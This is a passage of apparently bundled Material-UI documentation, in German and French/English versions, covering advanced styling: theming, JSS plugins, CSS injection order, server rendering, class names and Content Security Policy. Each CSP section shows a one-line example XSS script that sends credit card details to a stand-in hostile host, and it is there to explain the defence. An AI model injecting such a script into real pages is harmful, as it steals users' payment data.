Eigenschaften als erstes Argument an den Hook übergeben.\n\n```jsx\nconst useStyles = makeStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n});\n\nfunction Nested(props) {\n  const classes = useStyles(props);\n  return (\n    <button className={classes.root}>\n      <span className={classes.label}> // 'jss2 my-label'\n        nested\n      </span>\n    </button>\n  );\n}\n\nfunction Parent() {\n  return <Nested classes={{ label: 'my-label' }} />\n}\n```\n\n## JSS-Plugins\n\nJSS nutzt Plugins um seinen Kern zu erweitern, sodass Sie die Funktionen, die Sie benötigen auswählen können. Sie bezahlen nur für den Leistungsaufwand, den Sie verwenden.\n\nNicht alle Plugins sind standardmäßig in der Material-UI verfügbar. Folgende (die eine Teilmenge von [jss-preset-default](https://cssinjs.org/jss-preset-default/) sind) sind inklusive:\n\n- [jss-plugin-rule-value-function](https://cssinjs.org/jss-plugin-rule-value-function/)\n- [jss-plugin-global](https://cssinjs.org/jss-plugin-global/)\n- [jss-plugin-nested](https://cssinjs.org/jss-plugin-nested/)\n- [jss-plugin-camel-case](https://cssinjs.org/jss-plugin-camel-case/)\n- [jss-plugin-default-unit](https://cssinjs.org/jss-plugin-default-unit/)\n- [jss-plugin-vendor-prefixer](https://cssinjs.org/jss-plugin-default-unit/)\n- [jss-plugin-props-sort](https://cssinjs.org/jss-plugin-vendor-prefixer/)\n\nSelbstverständlich können Sie weitere Plugins benutzen. Hier ist ein Beispiel mit dem [ jss-rtl ](https://github.com/alitaheri/jss-rtl) Plugin.\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/styles';\nimport rtl from 'jss-rtl'\n\nconst jss = create({\n  plugins: [...jssPreset().plugins, rtl()],\n});\n\nfunction App() {\n  return (\n    <StylesProvider jss={jss}>\n      ...\n    </StylesProvider>\n  );\n}\n\nexport default App;\n```\n\n## String-Vorlagen\n\nWenn Sie die CSS-Syntax gegenüber JSS bevorzugen, können Sie das [jss-plugin-template](https://cssinjs.org/jss-plugin-template/) Plugin verwenden.\n\n```jsx\nconst useStyles = makeStyles({\n  root: `\n    background: linear-gradient(45deg, #fe6b8b 30%, #ff8e53 90%);\n    border-radius: 3px;\n    font-size: 16px;\n    border: 0;\n    color: white;\n    height: 48px;\n    padding: 0 30px;\n    box-shadow: 0 3px 5px 2px rgba(255, 105, 135, 0.3);\n  `,\n});\n```\n\nBeachten Sie, dass dies keine Selektoren oder verschachtelten Regeln unterstützt.\n\n{{\"demo\": \"pages/styles/advanced/StringTemplates.js\"}}\n\n## CSS-Injektionsreihenfolge\n\n> Es ist **wirklich wichtig** um zu verstehen, wie die CSS-Spezifität vom Browser berechnet wird. Dies ist eines der Schlüsselelemente, die beim Überschreiben von Stilen zu beachten sind. Wir **ermutigen** Sie diesen MDN-Absatz: [How is specificity calculated?](https://developer.mozilla.org/en-US/docs/Web/CSS/Specificity#How_is_specificity_calculated) zu lesen\n\nStandardmäßig werden die Style-Tags **zuletzt** im `<head>` -Element der Seite eingefügt. Sie erhalten mehr Details als jedes andere Styletag auf Ihrer Seite, z.B. CSS-Module oder StilKomponenten.\n\n### injectFirst\n\nDer `StylesProvider` Komponente hat eine `injectFirst` Eigenschaft, um **zuerst** die Style-Tags im Kopf einzufügen (weniger Priorität):\n\n```jsx\nimport { StylesProvider } from '@material-ui/styles';\n\n<StylesProvider injectFirst>\n  {/* Dein Komponentenbaum.\n      Mit Stil versehene Komponenten können die Stile von Material-UI überschreiben. */}\n</StylesProvider>\n```\n\n### `makeStyles` / `withStyles` / `styled`\n\nDas Einfügen von Style-Tags erfolgt in der **gleichen Reihenfolge** wie die `makeStyles`/`withStyles`/`styled` Aufrufe. Zum Beispiel gewinnt die Farbe Rot in diesem Fall:\n\n```jsx\nimport clsx from 'clsx';\nimport { makeStyles } from '@material-ui/styles';\n\nconst useStylesBase = makeStyles({\n  root: {\n    color: 'blue', // 🔵\n  },\n});\n\nconst useStyles = makeStyles({\n  root: {\n    color: 'red', // 🔴\n  },\n});\n\nexport default function MyComponent() {\n  // Order doesn't matter\n  const classes = useStyles();\n  const classesBase = useStylesBase();\n\n  // Order doesn't matter\n  const className = clsx(classes.root, classesBase.root)\n\n  // color: red 🔴 wins.\n  return <div className={className} />;\n}\n```\n\nDie Hook-Aufrufreihenfolge und die Klassennamensverkettungsreihenfolge **spielen keine Rolle**.\n\n### insertionPoint\n\nJSS [bietet einen Mechanismus](https://github.com/cssinjs/jss/blob/master/docs/setup.md#specify-the-dom-insertion-point) um diese Situation zu kontrollieren. Durch Hinzufügen der Platzierung des `Einfügepunkts` innerhalb Ihres HTML-Heads können Sie die [Reihenfolge steuern](https://cssinjs.org/jss-api#attach-style-sheets-in-a-specific-order), sodass die CSS-Regeln auf Ihre Komponenten angewendet werden.\n\n#### HTML-Kommentar\n\nAm einfachsten ist es, einen HTML-Kommentar zum `<head>` hinzuzufügen, der bestimmt, wo JSS die Stile einfügt:\n\n```html\n<head>\n  \x3c!-- jss-insertion-point --\x3e\n  <link href=\"...\">\n</head>\n```\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/styles';\n\nconst jss = create({\n  ...jssPreset(),\n  //  Wir definieren einen individuellen insertion point, welcher von JSS benutzt wird, um die Stile in den DOM einzufügen.\n  insertionPoint: 'jss-insertion-point',\n});\n\nfunction App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n\nexport default App;\n```\n\n#### Andere HTML-Elemente\n\n[Create React App](https://github.com/facebook/create-react-app) entfernt HTML-Kommentare beim Erstellen des Produktions-Builds. Um dieses Problem zu umgehen, können Sie ein DOM-Element (nicht einen Kommentar) als JSS-Einfügepunkt angeben, z. B. `<noscript>`:\n\n```jsx\n<head>\n  <noscript id=\"jss-insertion-point\" />\n  <link href=\"...\" />\n</head>\n```\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/styles';\n\nconst jss = create({\n  ...jssPreset(),\n  //  Wir definieren einen individuellen insertion point, welcher von JSS benutzt wird, um die Stile in den DOM einzufügen.\n  insertionPoint: document.getElementById('jss-insertion-point'),\n});\n\nfunction App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n\nexport default App;\n```\n\n#### JS createComment\n\ncodesandbox.io verhindert Zugriff auf das `<head>` Element. Um dieses Problem zu umgehen, können Sie die JavaScript `document.createComment()` API verwenden:\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/styles';\n\nconst styleNode = document.createComment('jss-insertion-point');\ndocument.head.insertBefore(styleNode, document.head.firstChild);\n\nconst jss = create({\n  ...jssPreset(),\n  // Definiert einen benutzerdefinierten Einfügepunkt, den JSS beim Einfügen der Stile in das DOM sucht.\n  insertionPoint: 'jss-insertion-point',\n});\n\nfunction App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n\nexport default App;\n```\n\n## Server-Rendering\n\nIn diesem Beispiel wird ein Html-String zurückgegeben und die erforderliche kritische Css direkt vor ihrer Verwendung eingebettet:\n\n```jsx\nimport ReactDOMServer from 'react-dom/server';\nimport { ServerStyleSheets } from '@material-ui/styles';\n\nfunction render() {\n  const sheets = new ServerStyleSheets();\n\n  const html = ReactDOMServer.renderToString(sheets.collect(<App />));\n  const css = sheets.toString();\n\n  return `\n<!DOCTYPE html>\n<html>\n  <head>\n    <style id=\"jss-server-side\">${css}</style>\n  </head>\n  <body>\n    <div id=\"root\">${html}</div>\n  </body>\n</html>\n  `;\n}\n```\n\nSie können der [serverseitigen Anleitung](/guides/server-rendering/) für ein detaillierteres Beispiel folgen oder lesen Sie die [`ServerStyleSheets`](/styles/api/#serverstylesheets) API-Dokumentation.\n\n### Gatsby\n\nWir haben [ein offizielles Plugin](https://github.com/hupe1980/gatsby-plugin-material-ui), welches serverseitiges Rendering für `@material-ui/styles` ermöglicht. Anleitungen zur Einrichtung und Verwendung finden Sie auf der Seite des Plugins.\n\nSiehe [dieses Beispielprojekt](https://github.com/mui-org/material-ui/blob/master/examples/gatsby) für ein aktuelles Verwendungsbeispiel.\n\n### Next.js\n\nSie müssen über eine benutzerdefiniertes `pages/_document.js` haben und [diese Logik](https://github.com/mui-org/material-ui/blob/master/examples/nextjs/pages/_document.js) kopieren, um die serverseitig gerenderten Stile in das `<head>` Element hinzuzufügen.\n\nSiehe [dieses Beispielprojekt](https://github.com/mui-org/material-ui/blob/master/examples/nextjs) für ein aktuelles Verwendungsbeispiel.\n\n## Klassennamen\n\nDie Klassennamen werden von dem [Klassennamengenerator](/styles/api/#creategenerateclassname-options-class-name-generator) generiert. Nehmen wir den folgenden Stil als Beispiel.\n\n### Standard\n\nStandardmäßig werden die Klassennamen von `@material-ui/styles`** nicht deterministisch** generiert; Man kann sich nicht darauf verlassen, dass sie gleich bleiben. Nehmen wir den folgenden Stil als Beispiel:\n\n```js\nconst useStyles = makeStyles({\n  root: {\n    opacity: 1,\n  },\n});\n```\n\nDadurch wird ein Klassenname wie `makeStyles-root-123` generiert.\n\nSie müssen die `Klassen` Eigenschaft einer Komponente verwenden, um die Styles zu überschreiben. Die nicht deterministische Natur der Klassennamen ermöglicht die Stilisolation.\n\n- In der **Entwicklung** lauten der Klassenname: `.makeStyles-root-123` nach dieser Logik:\n\n```js\nconst sheetName = 'makeStyles';\nconst ruleName = 'root';\nconst identifier = 123;\n\nconst className = `${sheetName}-${ruleName}-${identifier}`;\n```\n\n- In der **Produktion** lauten der Klassenname: `.jss123` nach dieser Logik:\n\n```js\nconst productionPrefix = 'jss';\nconst identifier = 123;\n\nconst className = `${productionPrefix}-${identifier}`;\n```\n\n### Mit `@material-ui/core`\n\nDie generierten Klassennamen der `@material-ui/core` Komponenten verhalten sich anders. Wenn die folgenden Bedingungen erfüllt sind, sind die Klassennamen **deterministisch**:\n\n- Es wird nur ein Themeanbieter verwendet (**Keine Verschachtelung von Themes**)\n- The style sheet has a name that starts with `Mui` (all Material-UI components).\n- The `disableGlobal` option of the [class name generator](/styles/api/#creategenerateclassname-options-class-name-generator) is `false` (the default).\n\nDiese Bedingungen werden bei den häufigsten Anwendungsfällen von `@material-ui/core` erfüllt. Zum Beispiel dieses Stylesheet:\n\n```jsx\nconst useStyles = makeStyles({\n  root: { /* … */ },\n  label: { /* … */ },\n  outlined: {\n    /* … */\n    '&$disabled': { /* … */ },\n  },\n  outlinedPrimary: {\n    /* … */\n    '&:hover': { /* … */ },\n  },\n  disabled: {},\n}, { name: 'MuiButton' });\n```\n\ngeneriert die folgenden Klassennamen, die Sie überschreiben können:\n\n```css\n.MuiButton-root { /* … */ }\n.MuiButton-label { /* … */ }\n.MuiButton-outlined { /* … */ }\n.MuiButton-outlined.Mui-disabled { /* … */ }\n.MuiButton-outlinedPrimary: { /* … */ }\n.MuiButton-outlinedPrimary:hover { /* … */ }\n```\n\n*Dies ist eine Vereinfachung des `@material-ui/core/Button` Stylesheet der Komponente.*\n\nDie Anpassung des TextFields kann mit der [ `classes-`API ](#overriding-styles-classes-prop) mühsam sein, wo Sie die classes Eingenschaft definieren müssen. Die Standardwerte sind, wie oben beschrieben, einfacher zu verwenden. Zum Beispiel:\n\n```jsx\nimport styled from 'styled-components';\nimport { TextField } from '@material-ui/core';\n\nconst StyledTextField = styled(TextField)`\n  label.focused {\n    color: green; 💚\n  }\n  .MuiOutlinedInput-root {\n    fieldset {\n      border-color: red; 💔\n    }\n    &:hover fieldset {\n      border-color: yellow; 💛\n    }\n    &.Mui-focused fieldset {\n      border-color: green; 💚\n    }\n  }\n`;\n```\n\n{{\"demo\": \"pages/styles/advanced/GlobalClassName.js\"}}\n\n## Globales CSS\n\n### `jss-plugin-global`\n\nDas [`jss-plugin-global`](#jss-plugins) Plugin ist in der Standardvoreinstellung installiert. Sie können es verwenden, um globale Klassennamen zu definieren.\n\n{{\"demo\": \"pages/styles/advanced/GlobalCss.js\"}}\n\n### Hybrid\n\nSie können auch JSS-generierte Klassennamen mit globalen Namen kombinieren.\n\n{{\"demo\": \"pages/styles/advanced/HybridGlobalCss.js\"}}\n\n## CSS-Präfix\n\nJSS verwendet Featureerkennung, um die korrekten Präfixe anzuwenden. [Seien Sie nicht überrascht](https://github.com/mui-org/material-ui/issues/9293) wenn Sie in der neuesten Version von Chrome kein bestimmtes Präfix sehen können. Ihr Browser benötigt es wahrscheinlich nicht.\n\n## Inhaltssicherheitsrichtlinie (Content Security Policy, CSP)\n\n### Was ist CSP und warum ist es nützlich?\n\nGrundsätzlich verringert CSP Cross-Site Scripting (XSS)-Angriffe, indem Entwickler die Quellen angeben, aus denen ihre Assets abgerufen werden. Diese Liste wird vom Server als Header zurückgegeben. Angenommen, Sie haben eine Website unter `https://example.com` gehostet. Der CSP-Header `default-src: 'self';` erlaubt alle Assets, die sich unter `https://example.com/*` befinden und blockt alle anderen. Wenn es auf Ihrer Website einen für XSS anfälligen Bereich gibt, in dem nicht eingegebene Benutzereingaben angezeigt werden, könnte ein Angreifer Folgendes eingeben:\n\n```html\n<script>\n  sendCreditCardDetails('https://hostile.example');\n<\/script>\n```\n\nDiese Sicherheitsanfälligkeit ermöglicht es dem Angreifer, irgendetwas auszuführen. Mit einem sicheren CSP-Header lädt der Browser dieses Skript jedoch nicht.\n\nWeitere Informationen zu CSP finden Sie in den [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).\n\n### Wie kann man CSP implementieren?\n\nUm CSP mit Material-UI (und JSS) verwenden zu können, müssen Sie eine Nonce verwenden. Eine Nonce ist eine zufällig generierte Zeichenfolge, die nur einmal verwendet wird. Daher müssen Sie eine Server-Middleware hinzufügen, um für jede Anforderung eine zu generieren. JSS hat ein [tolles Tutorial](https://github.com/cssinjs/jss/blob/master/docs/csp.md) wie man dies mit Express und React Helmet erreichen kann. Lesen Sie für einen grundlegenden Überblick weiter.\n\nEine CSP-Nonce ist eine Base 64-codierte Zeichenfolge. Sie können diese so erstellen:\n\n```js\nimport uuidv4 from 'uuid/v4';\n\nconst nonce = new Buffer(uuidv4()).toString('base64');\n```\n\nEs ist sehr wichtig, dass Sie die UUID Version 4 verwenden, da es einen **unvorhersehbaren** String generiert. Sie wenden dann dieses Nonce auf den CSP-Header an. Ein CSP-Header könnte mit der angewendeten Nonce so aussehen:\n\n```js\nheader('Content-Security-Policy')\n  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);\n```\n\nWenn Sie Server Side-Rendering (SSR) verwenden, sollten Sie die Nonce im `<style>`-Tag des Servers übergeben.\n\n```jsx\n<style\n  id=\"jss-server-side\"\n  nonce={nonce}\n  dangerouslySetInnerHTML={{ __html: sheets.toString() }}\n/>\n```\n\nDann müssen Sie dieses Nonce an JSS übergeben, damit es den nachfolgenden `<style>`-Tags hinzugefügt werden kann. The client-side gets the nonce from a header. Sie müssen diesen Header unabhängig davon angeben, ob SSR verwendet wird oder nicht.\n\n```jsx\n<meta property=\"csp-nonce\" content={nonce} />\n```"},eRi8:function(e,n){e.exports="# Avancé\n\n<p class=\"description\">This section covers more advanced usage of @material-ui/styles.</p>\n\n## Theming\n\nAdd a `ThemeProvider` to the top level of your app to pass the theme down the React component tree. Then, you can access the theme object in style functions.\n\n```jsx\nimport { ThemeProvider } from '@material-ui/styles';\n\nconst theme = {\n  background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',\n};\n\nfunction Theming() {\n  return (\n    <ThemeProvider theme={theme}>\n      <DeepChild />\n    </ThemeProvider>\n  );\n}\n```\n\n{{\"demo\": \"pages/styles/advanced/Theming.js\"}}\n\n### Accéder au thème dans un composant\n\nYou might need to access the theme variables inside your React components.\n\n#### `useTheme` hook\n\n```jsx\nimport { useTheme } from '@material-ui/styles';\n\nfunction DeepChild() {\n  const theme = useTheme();\n  return <span>{`spacing ${theme.spacing}`}</span>;\n}\n```\n\n{{\"demo\": \"pages/styles/advanced/UseTheme.js\"}}\n\n#### `withTheme` HOC\n\n```jsx\nimport { withTheme } from '@material-ui/styles';\n\nfunction DeepChildRaw(props) {\n  return <span>{`spacing ${props.theme.spacing}`}</span>;\n}\n\nconst DeepChild = withTheme(DeepChildRaw);\n```\n\n{{\"demo\": \"pages/styles/advanced/WithTheme.js\"}}\n\n### Theme nesting\n\nYou can nest multiple theme providers. This can be really useful when dealing with different areas of your application that have distinct appearance from each other.\n\n```jsx\n<ThemeProvider theme={outerTheme}>\n  <Child1 />\n  <ThemeProvider theme={innerTheme}>\n    <Child2 />\n  </ThemeProvider>\n</ThemeProvider>\n```\n\n{{\"demo\": \"pages/styles/advanced/ThemeNesting.js\"}}\n\nLe thème intérieur **remplacera** le thème extérieur. Vous pouvez étendre le thème externe en fournissant une fonction :\n\n```jsx\n<ThemeProvider theme={…} >\n  <Child1 />\n  <ThemeProvider theme={outerTheme => ({ darkMode: true, ...outerTheme })}>\n    <Child2 />\n  </ThemeProvider>\n</ThemeProvider>\n```\n\n## Overriding styles - `classes` prop\n\nThe `makeStyles` (hook generator) and `withStyles` (HOC) APIs allow the creation of multiple style rules per style sheet. Each style rule has its own class name. The class names are provided to the component with the `classes` variable. This is particularly useful when styling nested elements in a component.\n\n```jsx\n// A style sheet\nconst useStyles = makeStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n});\n\nfunction Nested(props) {\n  const classes = useStyles();\n  return (\n    <button className={classes.root}> // 'jss1'\n      <span className={classes.label}> // 'jss2'\n        nested\n      </span>\n    </button>\n  );\n}\n\nfunction Parent() {\n  return <Nested />\n}\n```\n\nHowever, the class names are often non-deterministic. How can a parent component override the style of a nested element?\n\n### withStyles\n\nThis is the simplest case. the wrapped component accepts a `classes` prop, it simply merges the class names provided with the style sheet.\n\n```jsx\nconst Nested = withStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n})(({ classes }) => (\n  <button className={classes.root}>\n    <span className={classes.label}> // 'jss2 my-label'\n      Nested\n    </span>\n  </button>\n));\n\nfunction Parent() {\n  return <Nested classes={{ label: 'my-label' }} />\n}\n```\n\n### makeStyles\n\nThe hook API requires a bit more work. You have to forward the parent props to the hook as a first argument.\n\n```jsx\nconst useStyles = makeStyles({\n  root: {}, // a style rule\n  label: {}, // a nested style rule\n});\n\nfunction Nested(props) {\n  const classes = useStyles(props);\n  return (\n    <button className={classes.root}>\n      <span className={classes.label}> // 'jss2 my-label'\n        nested\n      </span>\n    </button>\n  );\n}\n\nfunction Parent() {\n  return <Nested classes={{ label: 'my-label' }} />\n}\n```\n\n## JSS plugins\n\nJSS uses plugins to extend its core, allowing you to cherry-pick the features you need, and only pay the performance overhead for what you are using.\n\nNot all the plugins are available in Material-UI by default. The following (which is a subset of [jss-preset-default](https://cssinjs.org/jss-preset-default/)) are included:\n\n- [jss-plugin-rule-value-function](https://cssinjs.org/jss-plugin-rule-value-function/)\n- [jss-plugin-global](https://cssinjs.org/jss-plugin-global/)\n- [jss-plugin-nested](https://cssinjs.org/jss-plugin-nested/)\n- [jss-plugin-camel-case](https://cssinjs.org/jss-plugin-camel-case/)\n- [jss-plugin-default-unit](https://cssinjs.org/jss-plugin-default-unit/)\n- [jss-plugin-vendor-prefixer](https://cssinjs.org/jss-plugin-vendor-prefixer/)\n- [jss-plugin-props-sort](https://cssinjs.org/jss-plugin-props-sort/)\n\nOf course, you are free to use additional plugins. Here is an example with the [jss-rtl](https://github.com/alitaheri/jss-rtl) plugin.\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/styles';\nimport rtl from 'jss-rtl'\n\nconst jss = create({\n  plugins: [...jssPreset().plugins, rtl()],\n});\n\nfunction App() {\n  return (\n    <StylesProvider jss={jss}>\n      ...\n    </StylesProvider>\n  );\n}\n\nexport default App;\n```\n\n## String templates\n\nIf you prefer CSS syntax over JSS, you can use the [jss-plugin-template](https://cssinjs.org/jss-plugin-template/) plugin.\n\n```jsx\nconst useStyles = makeStyles({\n  root: `\n    background: linear-gradient(45deg, #fe6b8b 30%, #ff8e53 90%);\n    border-radius: 3px;\n    font-size: 16px;\n    border: 0;\n    color: white;\n    height: 48px;\n    padding: 0 30px;\n    box-shadow: 0 3px 5px 2px rgba(255, 105, 135, 0.3);\n  `,\n});\n```\n\nNote that this doesn't support selectors, or nested rules.\n\n{{\"demo\": \"pages/styles/advanced/StringTemplates.js\"}}\n\n## CSS injection order\n\n> It's **really important** to understand how the CSS specificity is calculated by the browser. It's one of the key elements to know when overriding styles. We **encourage** you to read this MDN paragraph: [How is specificity calculated?](https://developer.mozilla.org/en-US/docs/Web/CSS/Specificity#How_is_specificity_calculated)\n\nBy default, the style tags are injected **last** in the `<head>` element of the page. They gain more specificity than any other style tags on your page e.g. CSS modules, styled components.\n\n### injectFirst\n\nThe `StylesProvider` component has an `injectFirst` prop to inject the style tags **first** in the head (less priority):\n\n```jsx\nimport { StylesProvider } from '@material-ui/styles';\n\n<StylesProvider injectFirst>\n  {/* Your component tree.\n      Styled components can override Material-UI's styles. */}\n</StylesProvider>\n```\n\n### `makeStyles` / `withStyles` / `styled`\n\nThe injection of style tags happens in the **same order** as the `makeStyles` / `withStyles` / `styled` invocations. For instance the color red wins in this case:\n\n```jsx\nimport clsx from 'clsx';\nimport { makeStyles } from '@material-ui/styles';\n\nconst useStylesBase = makeStyles({\n  root: {\n    color: 'blue', // 🔵\n  },\n});\n\nconst useStyles = makeStyles({\n  root: {\n    color: 'red', // 🔴\n  },\n});\n\nexport default function MyComponent() {\n  // Order doesn't matter\n  const classes = useStyles();\n  const classesBase = useStylesBase();\n\n  // Order doesn't matter\n  const className = clsx(classes.root, classesBase.root)\n\n  // color: red 🔴 wins.\n  return <div className={className} />;\n}\n```\n\nThe hook call order and the class name concatenation order **don't matter**.\n\n### insertionPoint\n\nJSS [provides a mechanism](https://github.com/cssinjs/jss/blob/master/docs/setup.md#specify-the-dom-insertion-point) to control this situation. By adding an `insertionPoint` within the HTML you can [control the order](https://cssinjs.org/jss-api#attach-style-sheets-in-a-specific-order) that the CSS rules are applied to your components.\n\n#### HTML comment\n\nThe simplest approach is to add an HTML comment to the `<head>` that determines where JSS will inject the styles:\n\n```html\n<head>\n  \x3c!-- jss-insertion-point --\x3e\n  <link href=\"...\">\n</head>\n```\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/styles';\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: 'jss-insertion-point',\n});\n\nfunction App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n\nexport default App;\n```\n\n#### Other HTML element\n\n[Create React App](https://github.com/facebook/create-react-app) strips HTML comments when creating the production build. To get around this issue, you can provide a DOM element (other than a comment) as the JSS insertion point, for example, a `<noscript>` element:\n\n```jsx\n<head>\n  <noscript id=\"jss-insertion-point\" />\n  <link href=\"...\" />\n</head>\n```\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/styles';\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: document.getElementById('jss-insertion-point'),\n});\n\nfunction App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n\nexport default App;\n```\n\n#### JS createComment\n\ncodesandbox.io prevents access to the `<head>` element. To get around this issue, you can use the JavaScript `document.createComment()` API:\n\n```jsx\nimport { create } from 'jss';\nimport { StylesProvider, jssPreset } from '@material-ui/styles';\n\nconst styleNode = document.createComment('jss-insertion-point');\ndocument.head.insertBefore(styleNode, document.head.firstChild);\n\nconst jss = create({\n  ...jssPreset(),\n  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.\n  insertionPoint: 'jss-insertion-point',\n});\n\nfunction App() {\n  return <StylesProvider jss={jss}>...</StylesProvider>;\n}\n\nexport default App;\n```\n\n## Server-side rendering\n\nThis example returns a string of HTML and inlines the critical CSS required, right before it’s used:\n\n```jsx\nimport ReactDOMServer from 'react-dom/server';\nimport { ServerStyleSheets } from '@material-ui/styles';\n\nfunction render() {\n  const sheets = new ServerStyleSheets();\n\n  const html = ReactDOMServer.renderToString(sheets.collect(<App />));\n  const css = sheets.toString();\n\n  return `\n<!DOCTYPE html>\n<html>\n  <head>\n    <style id=\"jss-server-side\">${css}</style>\n  </head>\n  <body>\n    <div id=\"root\">${html}</div>\n  </body>\n</html>\n  `;\n}\n```\n\nYou can [follow the server side guide](/guides/server-rendering/) for a more detailed example, or read the [`ServerStyleSheets`](/styles/api/#serverstylesheets) API documentation.\n\n### Gatsby\n\nWe have [an official plugin](https://github.com/hupe1980/gatsby-plugin-material-ui) that enables server-side rendering for `@material-ui/styles`. Refer to the plugin's page for setup and usage instructions.\n\nRefer to [this example project](https://github.com/mui-org/material-ui/blob/master/examples/gatsby) for an up-to-date usage example.\n\n### Next.js\n\nYou need to have a custom `pages/_document.js`, then copy [this logic](https://github.com/mui-org/material-ui/blob/master/examples/nextjs/pages/_document.js) to inject the server-side rendered styles into the `<head>` element.\n\nRefer to [this example project](https://github.com/mui-org/material-ui/blob/master/examples/nextjs) for an up-to-date usage example.\n\n## Class names\n\nThe class names are generated by [the class name generator](/styles/api/#creategenerateclassname-options-class-name-generator).\n\n### Default\n\nBy default, the class names generated by `@material-ui/styles` are **non-deterministic**; you can't rely on them to stay the same. Let's take the following style as an example:\n\n```js\nconst useStyles = makeStyles({\n  root: {\n    opacity: 1,\n  },\n});\n```\n\nThis will generate a class name such as `makeStyles-root-123`.\n\nYou have to use the `classes` prop of a component to override the styles. The non-deterministic nature of the class names enables style isolation.\n\n- In **development**, the class name is: `.makeStyles-root-123`, following this logic:\n\n```js\nconst sheetName = 'makeStyles';\nconst ruleName = 'root';\nconst identifier = 123;\n\nconst className = `${sheetName}-${ruleName}-${identifier}`;\n```\n\n- In **production**, the class name is: `.jss123`, following this logic:\n\n```js\nconst productionPrefix = 'jss';\nconst identifier = 123;\n\nconst className = `${productionPrefix}-${identifier}`;\n```\n\n### With `@material-ui/core`\n\nThe generated class names of the `@material-ui/core` components behave differently. When the following conditions are met, the class names are **deterministic**:\n\n- Only one theme provider is used (**No theme nesting**)\n- The style sheet has a name that starts with `Mui` (all Material-UI components).\n- The `disableGlobal` option of the [class name generator](/styles/api/#creategenerateclassname-options-class-name-generator) is `false` (the default).\n\nThese conditions are met with the most common use cases of `@material-ui/core`. For instance, this style sheet:\n\n```jsx\nconst useStyles = makeStyles({\n  root: { /* … */ },\n  label: { /* … */ },\n  outlined: {\n    /* … */\n    '&$disabled': { /* … */ },\n  },\n  outlinedPrimary: {\n    /* … */\n    '&:hover': { /* … */ },\n  },\n  disabled: {},\n}, { name: 'MuiButton' });\n```\n\ngenerates the following class names that you can override:\n\n```css\n.MuiButton-root { /* … */ }\n.MuiButton-label { /* … */ }\n.MuiButton-outlined { /* … */ }\n.MuiButton-outlined.Mui-disabled { /* … */ }\n.MuiButton-outlinedPrimary: { /* … */ }\n.MuiButton-outlinedPrimary:hover { /* … */ }\n```\n\n*This is a simplification of the `@material-ui/core/Button` component's style sheet.*\n\nCustomization of the TextField can be cumbersome with the [`classes` API](#overriding-styles-classes-prop), where you have to define the the classes prop. It's easier to use the default values, as described above. For example:\n\n```jsx\nimport styled from 'styled-components';\nimport { TextField } from '@material-ui/core';\n\nconst StyledTextField = styled(TextField)`\n  label.focused {\n    color: green; 💚\n  }\n  .MuiOutlinedInput-root {\n    fieldset {\n      border-color: red; 💔\n    }\n    &:hover fieldset {\n      border-color: yellow; 💛\n    }\n    &.Mui-focused fieldset {\n      border-color: green; 💚\n    }\n  }\n`;\n```\n\n{{\"demo\": \"pages/styles/advanced/GlobalClassName.js\"}}\n\n## CSS global\n\n### `jss-plugin-global`\n\nThe [`jss-plugin-global`](#jss-plugins) plugin is installed in the default preset. You can use it to define global class names.\n\n{{\"demo\": \"pages/styles/advanced/GlobalCss.js\"}}\n\n### Hybrid\n\nYou can also combine JSS generated class names with global ones.\n\n{{\"demo\": \"pages/styles/advanced/HybridGlobalCss.js\"}}\n\n## CSS prefixes\n\nJSS uses feature detection to apply the correct prefixes. [Don't be surprised](https://github.com/mui-org/material-ui/issues/9293) if you can't see a specific prefix in the latest version of Chrome. Your browser probably doesn't need it.\n\n## Politique de sécurité du contenu (CSP)\n\n### Qu'est-ce que le CSP et en quoi est-ce utile ?\n\nFondamentalement, CSP atténue les attaques XSS (Cross-Site Scripting) en obligeant les développeurs à ajouter aux listes blanches les sources de leurs ressources. Cette liste est renvoyée en tant qu'en-tête du serveur. Par exemple, disons que vous avez un site hébergé à ` https://example.com ` l'en-tête CSP ` default-src: 'self'; ` autorisera toutes les requêtes à destination de ` https://example.com/* ` et refusera tous les autres. Si une section de votre site Web est vulnérable au XSS dans laquelle une entrée d'utilisateur non échappée est affichée, un attaquant pourrait saisir quelque chose du genre :\n\n```html\n<script>\n  sendCreditCardDetails('https://hostile.example');\n<\/script>\n```\n\nCette vulnérabilité permettrait à l'attaquant d'exécuter n'importe quoi. Cependant, avec un en-tête CSP sécurisé, le navigateur ne chargera pas ce script.\n\nYou can read more about CSP on the [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).\n\n### Comment met-on en place un CSP?\n\nPour utiliser CSP avec Material-UI (et JSS), vous devez utiliser un \"nonce\". A nonce is a randomly generated string that is only used once, therefore you need to add server middleware to generate one on each request. JSS a un [ excellent tutoriel ](https://github.com/cssinjs/jss/blob/master/docs/csp.md) comment y parvenir avec Express et React Helmet. Pour un aperçu de base, continuez à lire.\n\nUn nonce CSP est une chaîne codée en Base 64. Vous pouvez en générer un comme ceci:\n\n```js\nimport uuidv4 from 'uuid/v4';\n\nconst nonce = new 